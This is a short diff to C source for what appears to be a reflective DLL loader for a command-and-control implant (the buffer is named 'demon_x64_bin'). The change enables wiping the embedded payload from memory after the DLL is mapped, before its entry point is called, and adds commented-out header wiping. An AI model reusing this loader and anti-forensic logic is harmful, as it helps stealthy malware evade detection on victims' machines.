@@ -128,13 +128,20 @@ int main()
         }
         
     }
-    
+
+    // system( "pause" );
+
+    // memset( sectionHeaders, 0, ntHeaders->FileHeader.NumberOfSections * sizeof( IMAGE_SECTION_HEADER ) );
     
     BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
     
-    // memset(demon_x64_bin, 0, demon_x64_bin_len);
+    memset(demon_x64_bin, 0, demon_x64_bin_len);
 
     KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );
+
+    printf("This is Never Printed\n");
+
+    // system( "pause" );
 
     return 0;
 }
